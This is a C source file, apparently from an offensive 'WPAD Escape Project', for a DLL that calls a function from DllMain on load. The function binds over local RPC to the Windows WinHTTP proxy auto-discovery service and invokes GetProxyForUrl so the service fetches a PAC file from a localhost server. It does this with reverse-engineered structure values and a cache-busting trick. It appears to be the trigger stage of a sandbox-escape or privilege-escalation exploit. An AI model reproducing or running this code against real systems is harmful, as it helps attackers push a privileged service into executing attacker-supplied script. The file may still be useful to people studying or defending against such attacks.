/*
WPAD Escape Project
*/

#pragma once

#include "WpadEscape.h"


/*
The midl_user_allocate function is a procedure that must be
supplied by developers of RPC applications. It allocates memory
for the RPC stubs and library routines.

Reference: https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-allocate-function
*/

VOID
__RPC_FAR *__RPC_USER
midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR *) malloc(cBytes));
}


/*
The midl_user_free function must be supplied by RPC developers.
It allocates memory for the RPC stubs and library routines.

Reference: https://docs.microsoft.com/en-us/windows/desktop/Rpc/the-midl-user-free-function
*/

VOID
__RPC_USER
midl_user_free(VOID __RPC_FAR *ptr)
{
	free(ptr);
}


RPC_STATUS
WpadEscape(
	VOID
)
{
	INT nReply = 0;
	DWORD pInt = 0;
	Struct_2 pStruct_2 = { 0 };
	DWORD WinHttpStatusCode = 0;
	LPWSTR Protocol = L"ncalrpc";
	RPC_WSTR StringBinding = NULL;
	RPC_STATUS RpcStatus = RPC_S_OK;
	DWORD dwWaitResult = WAIT_FAILED;
	RPC_BINDING_HANDLE hRpcBinding = NULL;
	HANDLE pNameResTrkRecordHandle = NULL;
	WCHAR AutoConfigUrl[MAX_PATH] = { 0 };
	RPC_ASYNC_STATE RpcAsyncState = { 0 };
	tagProxyResolveUrl ProxyResolveUrl = { 0 };
	WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
	WINHTTP_AUTOPROXY_OPTIONS AutoProxyOptions = { 0 };
	PWCHAR PacUrl = L"http://localhost:8000/wpad.dat?%lld";

	/*
	Now craft the PAC URL. Once the WPAD queries a URL, it caches it.
	So, if you run the WPAD query again with the same URL, it won't fetch again.
	
	To avoid this, simply append a random query string to the URL.
	*/

	_snwprintf_s(
		AutoConfigUrl,
		ARRAYSIZE(AutoConfigUrl),
		ARRAYSIZE(AutoConfigUrl),
		PacUrl,
		__rdtsc()
	);

	/*
	This structure contains the URL for which the proxy information
	needs to be resolved.
	*/

	ProxyResolveUrl.Url = L"http://www.google.com/";
	ProxyResolveUrl.Domain = L"www.google.com";
	ProxyResolveUrl.Seperator = L"/";
	ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
	ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB

	/*
	This structure holds the flag and the path of Auto Configuration URL.
	This is the URL from where the PAC file needs to be fetched.
	*/

	AutoProxyOptions.lpszAutoConfigUrl = AutoConfigUrl;
	AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;

	/*
	The below constants are UNKNOW at the moment.
	This was found by reversing winhttp.dll.
	*/

	pStruct_2.Member0 = 0xffffffff;
	pStruct_2.Member1 = 0x0000ea60; // seems like dwTimeout 60000 MS
	pStruct_2.Member2 = 0x00000005;
	pStruct_2.Member3 = 0x00007530;
	pStruct_2.Member4 = 0x00007530;
	pStruct_2.Member5 = 0x00000000;

	/*
	Create the string binding handle.
	*/

	RpcStatus = RpcStringBindingCompose(
		0,
		(RPC_WSTR)Protocol,
		0,
		0,
		0,
		&StringBinding
	);

	if (RpcStatus == RPC_S_OK)
	{
		DEBUG(L"[+] RpcStringBindingCompose successful.");
	}
	else
	{
		DEBUG(L"[-] RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
		return RpcStatus;
	}

	/*
	Get the binding handle from string representation of the handle.
	*/

	RpcStatus = RpcBindingFromStringBinding(StringBinding, &hRpcBinding);

	if (RpcStatus == RPC_S_OK)
	{
		DEBUG(L"[+] RpcBindingFromStringBinding successful.");
	}
	else
	{
		DEBUG(L"[-] RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
		return RpcStatus;
	}

	/*
	Initialize RPC_ASYNC_STATE which is going to be used during async operation.
	*/
	
	RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState));

	if (RpcStatus == RPC_S_OK)
	{
		DEBUG(L"[+] RpcAsyncInitializeHandle successful.");
	}
	else
	{
		DEBUG(L"[-] RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
		return RpcStatus;
	}

	/*
	RPC run time can notify the client for the occurrence of an event using
	different mechanisms.

	Reference: https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state

	If you do not want to get notified, you can comment the below code.
	*/

	RpcAsyncState.UserInfo = NULL;
	RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
	RpcAsyncState.u.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

	if (RpcAsyncState.u.hEvent == 0)
	{
		DEBUG(L"[-] CreateEvent failed. Error: 0x%X", GetLastError());
		return RpcStatus;
	}

	RpcTryExcept
	{
		/*
		Call the GetProxyForUrl interface method which is responsible for initiating
		the RPC request to WinHTTP Web Proxy Auto-Discovery Service to fetch the PAC file.
		*/

		DEBUG(L"[+] Calling GetProxyForUrl RPC method.");

		GetProxyForUrl(
			&RpcAsyncState,
			hRpcBinding,
			&ProxyResolveUrl,
			&AutoProxyOptions,
			&pStruct_2,
			0,
			NULL,
			&pInt,
			&ProxyResult,
			&pNameResTrkRecordHandle,
			&WinHttpStatusCode
		);
	}
	RpcExcept(1)
	{
		DEBUG(L"[-] GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
	}
	RpcEndExcept

	/*
	Wait for the asyn operation to complete.
	*/

	dwWaitResult = WaitForSingleObject(RpcAsyncState.u.hEvent, 20000);

	if (dwWaitResult == WAIT_TIMEOUT || dwWaitResult == WAIT_FAILED)
	{
		/*
		Cancel the RPC call if timeout reached.
		*/
		
		RpcAsyncCancelCall(&RpcAsyncState, TRUE);
		CloseHandle(RpcAsyncState.u.hEvent);

		DEBUG(L"[-] Waiting for async call to complete failed.");

		return RpcStatus;
	}

	CloseHandle(RpcAsyncState.u.hEvent);
	
	/*
	Complete the asynchronous RPC call.
	*/

	RpcAsyncCompleteCall(&RpcAsyncState, &nReply);

	/*
	Free up the resources.
	*/

	RpcStringFree(&StringBinding);
	RpcBindingFree(&hRpcBinding);

	return RpcStatus;
}


BOOL
APIENTRY
DllMain(
	HMODULE hModule,
	DWORD   ul_reason_for_call,
	LPVOID  lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		WpadEscape();
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}